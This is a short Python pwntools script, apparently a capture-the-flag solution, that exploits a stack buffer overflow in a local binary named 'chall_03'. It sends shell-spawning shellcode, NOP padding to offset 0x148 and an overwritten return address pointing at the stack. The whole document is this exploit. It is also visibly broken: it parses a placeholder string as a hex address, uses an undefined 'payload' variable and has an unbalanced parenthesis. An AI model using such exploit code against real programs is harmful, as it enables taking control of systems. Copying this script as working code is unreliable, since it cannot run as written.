from pwn import *
p=process("./chall_03")
p.recv()
_ = b'leak'
stack = int(_,16)
p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(payload)) * b'\x90' + p64(stack)))
